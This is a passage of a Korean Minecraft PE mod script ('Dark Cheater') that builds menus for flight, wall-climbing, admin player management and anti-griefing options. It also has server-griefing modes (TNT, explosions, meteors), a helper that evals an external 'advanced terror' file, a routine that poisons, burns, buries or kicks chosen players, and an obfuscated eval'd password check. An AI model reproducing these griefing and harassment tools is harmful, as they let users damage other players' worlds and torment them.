openFlying();
j.on = true;
}
else if(onoff==false){
if(menuJ!=null){
menuJ.dismiss();
menuJ = null;
}
j.on = false;
}
}
}));
btnT[6].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
climbing = true;
Dark.toast("벽타기 활성화");
}
else if(onoff==false){
climbing = false;
Dark.toast("벽타기 비활성화");
}
}
}));
btnT[7].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
sneak = onoff;
if(!multi) Entity.setSneaking(ad, onoff);
else Entity.setSneaking(Player.getEntity(), onoff);
}
}));
btnT[8].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
smartMoving(onoff);
}
}));
btnT[9].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
nf.tf = onoff;
}
}));
btnT[10].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
jump = onoff;
}
}));
for(var n in menusT)
layout.addView(btnT[n]);
var button = new Array();
var menus = ["이동 방식 선택", "시계 지급", "좌표 기억/이동", "바라보는 곳으로 tp", "이동계 도움말"];
for(var n in menus)
button[n] = makeButton(menus[n]);
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
clockMoving();
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
addItemInventory(347, 1, 0);
Dark.toast("시계가 지급되었습니다.");
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(atp==0){
Dark.toast("도착 지점을 선택(터치)하세요.");
atp = 1;
}
else if(atp==2){
Dark.toast("터치하시면 이동됩니다.");
atp = 3;
}
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(ctp==false){
makeCross(true);
ctp = true;
Dark.toast("터치하시면 이동합니다.");
}
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("이동 계열 도움말", "벽타기 모드가 켜져있으면, 블록 한 칸은 올라갈 수 없습니다.\n\"이동 방식 선택\"은 시계로 터치했을 때, 어떻게 이동할지 선택하는 부분입니다.\n\n<제트팩 버튼 설명>\nS - 공중 체류\nF - 바라보는 방향으로 비행\nf/b - 비행 방향 설정(앞/뒤)\n\n<스마트 무빙 버튼 설명>\n왼쪽 버튼\nrun/walk - 달리기/걷기\nA.W. - 자동 걷기\n\n오른쪽 버튼\nB - 숙이기\nC - 벽타기\nG - 매달리기\nJ - 슈퍼 점프\nL - 엎드리기(?)\n");
}
});
for(var n in menus)
layout.addView(button[n]);
var exit = makeExit(menuM);
layout.addView(exit);
var scroll = makeScroll(layout, menuM);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuM.setContentView(layout2);
menuM.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function runFunc(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("실행할 함수를 입력하세요...");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("함수 실행");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
darkCmd = true;
darkCmd2 = loc2.getText()+"";
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function chatHook(str){
if(str.substr(0, 5)==".run "){
darkProcCmd(str.substring(5, str.length));
preventDefault();
}

}


function darkLiber(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuDL = new android.widget.PopupWindow();
var title = makeTitle("D.L. Skill");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var esps = new Array();
for(var n in espNames){
esps[n] = new android.widget.Switch(ctx);
esps[n].setText(espNames[n]);
if(dl.esp[n]==null)
esps[n].setChecked(false);
else
esps[n].setChecked(true);
esps[n].setId(n);
esps[n].setTextColor(white2);
esps[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(swit, onoff){
if(onoff==true){
espOn(swit.getId());
}
else if(onoff==false){
dl.esp[swit.getId()] = null;
Dark.toast(espNames[swit.getId()]+" 비활성화");
}
}
}));
layout.addView(esps[n]);
}
var ar = new android.widget.ToggleButton(ctx);
var mexp = new android.widget.ToggleButton(ctx);
var heal = new android.widget.ToggleButton(ctx);
ar.setTextOn("자동 수복/삭제");
ar.setTextOff("자동 수복/삭제");
mexp.setTextOn("서버장 폭발 데미지");
mexp.setTextOff("서버장 폭발 데미지");
heal.setTextOn("철칼 - 회복");
heal.setTextOff("철칼 - 회복");
ar.setTextColor(white2);
mexp.setTextColor(white2);
heal.setTextColor(white2);
ar.setChecked(auto);
mexp.setChecked(exp.onoff);
var file = new java.io.File(sdcard+"/darkTornado/ESP Script/onoff.txt");
heal.setChecked(file.exists());
ar.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
auto = true;
Dark.toast("자동수복&자동삭제 활성화");
}
else if(onoff==false){
auto = false;
Dark.toast("자동수복&자동삭제 비활성화");
}
}
}));
mexp.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
exp.onoff = onoff;
}
}));
heal.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
var folder = new java.io.File(sdcard+"/darkTornado/");
var folder2 = new java.io.File(sdcard+"/darkTornado/ESP Script/");
folder.mkdir();
folder2.mkdir();
var file = new java.io.File(sdcard+"/darkTornado/ESP Script/onoff.txt");
if(onoff){
try{
var fos = new java.io.FileOutputStream(file);
var str = new java.lang.String("true");
fos.write(str.getBytes());
fos.close();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else{
if(file.exists()) file.delete();
}
}
}));
layout.addView(ar);
layout.addView(mexp);
layout.addView(heal);
var al = new android.widget.Button(ctx);
var reset = new android.widget.Button(ctx);
var help = new android.widget.Button(ctx);
al.setText("안티렉 리셋");
reset.setText("모든 능력 리셋");
help.setText("도움말");
al.setBackgroundDrawable(setBtnColor());
reset.setBackgroundDrawable(setBtnColor());
help.setBackgroundDrawable(setBtnColor());
al.setTextColor(white2);
reset.setTextColor(white2);
help.setTextColor(white2);
al.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
anti = 0;
Dark.toast("리셋되었습니다.");
}
});
reset.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n in espNames){
dl.esp[n] = null;
esps[n].setChecked(false);
}
Dark.toast("모든 능력이 비활성화 되었습니다.");
}
});
help.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("D.L. Skill 도움말", "D.L. Skill는 Dark Tornado와 Liber de Obscurum이 공동개발중이라는 설정의 스킬들입니다. Dark Tornado와 Liber de Obscurum이 만들어놓은 스킬들 중 원하는 스킬을 부여받아서 사용한다는 설정입니다.(걍 능력자 스크립트임.)\n스킬은 다크 치터로만 부여가 가능하며, 금괴로 바닥이나 상대방을 터치하면 해당 스킬이 발동됩니다. 쿨타임은 모두 30초 입니다(정확히는 22.5초).\n\n<용어 설명>\n자동 수복 : 스킬 사용으로 인한 지형 파괴를 일정 시간이 지나면 자동으로 수복. 평지맵이 기준임.\n자동 삭제 : 스킬 사용으로 인해 생기는 블록들을 일정 시간이 지나면 자동으로 삭제. 대부분 평지맵이 기준임.\n안티 렉 : 폭발계 스킬 사용 시 발생하는 드롭된 아이템의 생성을 막음으로서 렉을 줄이는 기술\n\n<스킬 목록>\nFire Summon - 3×3+4로 불 소환\nWater Bind - 안쪽으로 흐르는 물을 5×5로 소환\nMono Tree - 나무 소환. 주변 적들 체력 감소.\nSand Burst - 모래를 3×3×3으로 소환. 3초 뒤 폭발.\nUndead Summon - 좀비와 스켈레톤을 각각 3마리 씩 소환\nPush - 타격시 상대방을 뒤로 밀침.\nBurst - 터치한 방향에서 폭발.\nAbsorb - 타격시 상대방 체력 흡수.\nLight Burster - 바라보는 방향으로 빛 발사\nDark Burster - 바라보는 방향으로 어둠 발사\n");
}
});
layout.addView(al);
layout.addView(reset);
layout.addView(help);
var exit = makeExit(menuDL);
layout.addView(exit);
var scroll = makeScroll(layout, menuDL);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuDL.setContentView(layout2);
menuDL.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function espOn(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var player;
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = new Array();
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(Player.getName(players[n]));
radio[n].setId(n);
radio[n].setTextColor(white);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
player = players[checkedId];
}
}));
layout.addView(radios);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle(espNames[nn]+" on");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
dl.esp[nn] = player;
Dark.toast(espNames[nn]+" on");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
Dark.toast("플레이어를 선택하세요.");
}


function antiTerrorSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuT = new android.widget.PopupWindow();
var title = makeTitle("테러 방지 옵션");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var menus = ["TNT 생성 방지", "폭발 삭제", "PVE 방지", "모든 창고 잠금", "물 방지", "용암 방지", "불 방지", "TNT 설치 방지", "거미줄 방지", "베드락 방지", "투명 베드락 방지", "옵시디언 방지", "빛나는 옵시디언 방지", "광역 파괴 자동 킥"];
var checkBox = new Array();
for(var n in menus){
checkBox[n] = new android.widget.CheckBox(ctx);
checkBox[n].setText(menus[n]);
checkBox[n].setId(n);
checkBox[n].setTextColor(white2);
checkBox[n].setChecked(antiTerror[n]);
checkBox[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
antiTerror[check.getId()] = true;
}
else if(onoff==false){
antiTerror[check.getId()] = false;
}
}
}));
layout.addView(checkBox[n]);
}
var ta = new android.widget.ToggleButton(ctx);
var at = new android.widget.ToggleButton(ctx);
ta.setTextOn("테러 알림 on");
ta.setTextOff("테러 알림 off");
at.setTextOn("서버장 포함");
at.setTextOff("서버장 포함");
ta.setTextColor(white2);
at.setTextColor(white2);
ta.setChecked(terrorAlert);
at.setChecked(adTer);
ta.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
terrorAlert = true;
}
else if(onoff==false){
terrorAlert = false;
}
}
}));
at.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
adTer = true;
}
else if(onoff==false){
adTer = false;
}
}
}));
layout.addView(ta);
layout.addView(at);
var btns = new Array();
var menus = ["전체 선택", "전체 해제", "블록 파괴 방지", "테러 기록 보기", "테러 기록 초기화"]
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n in checkBox)
checkBox[n].setChecked(true);
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n in checkBox)
checkBox[n].setChecked(false);
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
openMineDialog();
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showTerrorLog();
Dark.toast("창고 터치, 폭발 삭제, TNT 생성 방지는 포함되지 않습니다.");
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
terrorLog = "";
Dark.toast("초기화 되었습니다.");
}
});
for(var n in menus)
layout.addView(btns[n]);
var exit = makeExit(menuT);
layout.addView(exit);
var scroll = makeScroll(layout, menuT);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuT.setContentView(layout2);
menuT.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showItems(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loadWeb = new android.webkit.WebView(ctx);
loadWeb.setWebChromeClient(new android.webkit.WebChromeClient());
loadWeb.setWebViewClient(new android.webkit.WebViewClient());
loadWeb.loadUrl("http:\/\/hydra-media.cursecdn.com\/minecraft.gamepedia.com\/c\/c6\/DataValuesPE.png");
layout.addView(loadWeb);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 아이디");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function terrorHelper(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
if(Dark.read("terrorHelper")==""){
Dark.toast("추가 파일이 필요합니다.\n고급 테러를 비활성화 합니다.");
terPass = false;
}
eval(Dark.read("terrorHelper"));
}
else{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var menus = ["라이터 지급", "TNT 지급", "물 양동이 지급", "용암 양동이 지급", "거미줄 지급", "고급 테러"];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(w==0) addItemInventory(259, 1, 0);
else if(w==1) addItemInventory(46, 10, 0);
else if(w==2) addItemInventory(325, 1, 8);
else if(w==3) addItemInventory(325, 1, 10);
else if(w==4) addItemInventory(30, 1, 0);
else if(w==5) terrorPassword();
}
}));
dialog.setTitle("테러 도우미");
dialog.setNegativeButton("취소", null);
dialog.show();
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function eventPassDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("비밀 번호를 입력하세요...");
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("비밀번호 입력");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
try{
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1 2=[d,j];1 m=[5,6];1 l={l:8,9:a};1 b="c|q|e";f(g.h()==-2[0]){i=3;k=3;4.n("확인되었습니다.")}o{4.p("비밀번호가 다릅니다.")}1 7="누가 소스를 봐서 비밀번호를 알아내려고 하니?";',27,27,'|var|lolita|true|Dark|1234|2916|loli|1427|s|1974|ll|1982|2071|8288|if|loc2|getText|eventPass|2580|scriptEnable2||shotaro|toast|else|toast|7829'.split('|'),0,{});
eval(code);
}catch(e){clientMessage(e);}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeScreen(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menuBu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
if(ev.getAction()==android.view.MotionEvent.ACTION_DOWN){
Dark.save("btnX", ev.getRawX());
Dark.save("btnY", ev.getRawY());
if(btn!=null){
btn.dismiss();
btn = null;
}
Dark.makeButton();
Dark.toast("수정되었습니다.");
menuBu.dismiss();
}
return true;
}
}));
menuBu.setContentView(layout);
menuBu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menuBu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
menuBu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(120, 0, 0, 0)));
menuBu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function chatReceiveHook(str, s){
if(opCheck(s)){
procCmdOp(s, str);
}
if(wo.tf&&wo.user.indexOf(s)!=-1){
procCmdWE(s, str);
}
chatLog += "<"+s+"> "+str+"\n";
if(antiChat){
if(antiChatData.indexOf(s)!=-1){
preventDefault();
}
else{
new java.lang.Thread({
run : function(){
antiChatData.push(s);
java.lang.Thread.sleep(1000);
antiChatData.splice(antiChatData.indexOf(s), 1);
}
}).start();
}
}
if(chatIgnore.indexOf(s)!=-1){
preventDefault();
}
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+s+"(이)가 \""+str+"\"(이)라고 채팅함.\n";


}


function opCheck(name){
for(var n in ops){
if(Player.getName(ops[n])==name)
return true;
}
return false;
}


function findHuman(name){
for each(var e in Entity.getAll()){
if(Player.getName(e)==name)
return e;
}
}


function getDistanceFromAdmin(x, y, z){
var px, py, pz, dist;
px = x-Entity.getX(ad);
py = y-Entity.getY(ad);
pz = z-Entity.getZ(ad);
dist = Math.sqrt(Math.pow(px, 2)+Math.pow(py, 2)+Math.pow(pz, 2));
return dist;
}


function makeEffect(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var types = ["수중 호흡", "점프 강화", "신속", "아이템으로 지급"];
var type = null;
var typeId = null;
var radio = new Array();
for(var n in types){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(types[n]);
radio[n].setId(n);
radio[n].setTextColor(white);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
type = checkedId;
}
}));
layout.addView(radios);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 - 종류");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(type==3){
potionList();
}
else{
if(type==0) typeId = 10;
else if(type==1) typeId = 15;
else if(type==2) typeId = 22;
giveEffectTime(Player.getEntity(), typeId);
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function terrorSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuT2 = new android.widget.PopupWindow();
var title = makeTitle("서버 테러");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
var menus = ["비활성화", "TNT 설치", "구멍 생성", "폭발", "메테오", "불"];
var radio = new Array();
for(var n in menus){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(menus[n]);
radio[n].setTextColor(white2);
radio[n].setId(n);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
mapTerror = checkedId;
}
}));
layout.addView(radios);
var mem = new android.widget.ToggleButton(ctx);
mem.setTextOn("서버원 포함");
mem.setTextOff("서버원 포함");
mem.setTextColor(white2);
mem.setChecked(mapTerror2);
mem.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
mapTerror2 = onoff;
}
}));
layout.addView(mem);
var exit = makeExit(menuT2);
layout.addView(exit);
var scroll = makeScroll(layout, menuT2);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuT2.setContentView(layout2);
menuT2.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function startDestroyBlock(x, y, z){
if(Level.getGameMode()==0&&instaBreak){
Level.destroyBlock(x, y, z, true);
preventDefault();
if(gh[3]) destroyBlock(x, y, z);
}

}


function destroyBlock(x, y, z, s){
if(Level.getGameMode()==0&&gh[3]){
Level.dropItem(x, y, z, 0, getTile(x, y, z), 63, Level.getData(x, y, z));
Level.destroyBlock(x, y, z, true);
preventDefault();
}

}


function checkInternet(){
try{
var cm = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE);
var mobile = cm.getNetworkInfo(cm.TYPE_MOBILE);
var wifi = cm.getNetworkInfo(cm.TYPE_WIFI);
if(mobile.isConnected()||wifi.isConnected()){
return true;
}
else{
return false;
}
}
catch(e){
try{
if(wifi.isConnected()){
return true;
}
}
catch(err){
print(err);
}
}
}


function playersSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuP2 = new android.widget.PopupWindow();
var title = makeTitle("플레이어들 관리");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = new Array();
var playerTargets = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
var checks = new Array();
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
if(showPlayerHealth){
var pn = Player.getName(players[n]).split(" (");
checks[n].setText(pn[0]+"("+Entity.getHealth(players[n])+")");
}
else{
checks[n].setText(Player.getName(players[n])+"("+Entity.getHealth(players[n])+")");
}
checks[n].setId(n);
checks[n].setTextColor(white2);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
playerTargets.push(players[check.getId()]);
}
else if(onoff==false){
playerTargets.splice(playerTargets.indexOf(players[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var all = new android.widget.Button(ctx);
var reset = new android.widget.Button(ctx);
all.setText("모두 선택");
reset.setText("모두 해제");
all.setBackgroundDrawable(setBtnColor());
reset.setBackgroundDrawable(setBtnColor());
all.setTextColor(white2);
reset.setTextColor(white2);
all.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n in players){
if(!checks[n].isChecked())
checks[n].setChecked(true);
}
}
});
reset.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n in players){
if(checks[n].isChecked())
checks[n].setChecked(false);
}
}
});
layout.addView(all);
layout.addView(reset);
var button = new Array();
var menus = ["체력설정", "소환", "전송", "추방", "아이템 지급", "포션 효과 부여/삭제", "조지기", "칭호 부여", "최대 체력 설정"];
for(var n in menus)
button[n] = makeButton(menus[n]);
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerHealth(playerTargets);
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for each(var pp in playerTargets)
teleport(pp, Entity.getX(ad), Entity.getY(ad)+1, Entity.getZ(ad));
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTp(playerTargets);
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for each(var pp in playerTargets)
Entity.remove(pp);
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
addItem(true, playerTargets);
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(mcpev) giveEffectType(playerTargets, true);
else Dark.toast("0.10.5 이하에서는 사용하실 수 없습니다.");
}
});
button[5].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
for each(var pp in playerTargets)
Entity.removeAllEffects(pp);
Dark.toast("포션 효과를 지웠습니다.");
return true;
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
fuckYouPlayer(playerTargets);
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputTitle(playerTargets);
}
});
button[7].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
for each(var pp in playerTargets){
var pn = Player.getName(pp).toString().split("] §f");
if(pn[1]!=null) Entity.setNameTag(pp, pn[1]);
}
Dark.toast("칭호를 삭제하였습니다.");
return true;
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputMaxHealth(playerTargets);
}
});
button[8].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
for each(var pp in playerTargets)
Entity.setMaxHealth(pp, 20);
return true;
}
});
for(var n in menus)
layout.addView(button[n]);
var exit = makeExit(menuP2);
layout.addView(exit);
var scroll = makeScroll(layout, menuP2);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuP2.setContentView(layout2);
menuP2.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function fuckYouPlayer(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var types = ["독 효과", "멀미", "구속", "체력 1", "불붙이기", "거미줄", "생매장", "실명", "위로 tp"];
var fucks = [false, false, false, false, false, false, false, false, false];
var checks = new Array();
for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(types[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
fucks[check.getId()] = onoff;
}
}));
layout.addView(checks[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("플레이어 조지기");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(arr==null){
if(fucks[0]) Entity.addEffect(playerTarget, MobEffect.poison, 600, 2, true, false);
if(fucks[1]) Entity.addEffect(playerTarget, MobEffect.confusion, 600, 2, true, false);
if(fucks[2]) Entity.addEffect(playerTarget, MobEffect.movementSlowdown, 600, 2, true, false);
if(fucks[3]) Entity.setHealth(playerTarget, 1);
if(fucks[4]) Entity.setFireTicks(playerTarget, 600);
if(fucks[5]) setTiles(Entity.getX(playerTarget)-1, Entity.getX(playerTarget)+1, Entity.getY(playerTarget)-1, Entity.getY(playerTarget)-1, Entity.getZ(playerTarget)-1, Entity.getZ(playerTarget)+1, 30);
if(fucks[6]) setTiles(Entity.getX(playerTarget)-1, Entity.getX(playerTarget)+1, Entity.getY(playerTarget)+4, Entity.getY(playerTarget)+6, Entity.getZ(playerTarget)-1, Entity.getZ(playerTarget)+1, 12);
if(fucks[7]) Entity.addEffect(playerTarget, MobEffect.blindness, 600, 2, true, false);
if(fucks[8]) teleport(playerTarget, Entity.getX(playerTarget), Entity.getY(playerTarget)+15, Entity.getZ(playerTarget));
Dark.toast(Player.getName(playerTarget)+"(을)를 조집니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"(을)를 조집니다.", true);
}
else{
for each(var pp in arr){
if(fucks[0]) Entity.addEffect(pp, MobEffect.poison, 600, 2, true, false);
if(fucks[1]) Entity.addEffect(pp, MobEffect.confusion, 600, 2, true, false);
if(fucks[2]) Entity.addEffect(pp, MobEffect.movementSlowdown, 600, 2, true, false);
if(fucks[3]) Entity.setHealth(pp, 1);
if(fucks[4]) Entity.setFireTicks(pp, 600);
